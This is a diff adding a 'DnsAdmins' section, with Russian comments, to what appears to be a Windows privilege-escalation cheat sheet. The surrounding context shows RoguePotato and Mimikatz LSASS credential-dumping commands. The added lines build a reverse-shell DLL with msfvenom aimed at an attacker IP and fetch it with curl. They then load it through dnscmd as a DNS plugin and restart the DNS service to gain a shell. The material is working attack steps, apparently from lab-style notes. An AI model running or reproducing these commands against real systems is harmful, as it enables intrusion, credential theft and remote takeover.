@@ -288,6 +288,17 @@ C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
     sekurlsa::minidump lsass.dmp
     sekurlsa::logonpasswords
     
+# DnsAdmins
+
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.36 LPORT=9001 -f dll -o revshell_9001.dll     (Делаем dll с реверс шелом)
+    curl http://10.10.16.36/revshell_9001.dll -o revshell_9001.dll (Загружаем на хост)
+
+    dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\revshell_9001.dll      (добавляем в ключ реестра dll)
+    ------ останавливаем и запускаем dns службу
+    
+    sc stop dns
+    sc start dns
+
     
 # Подсказки для виндовс
 
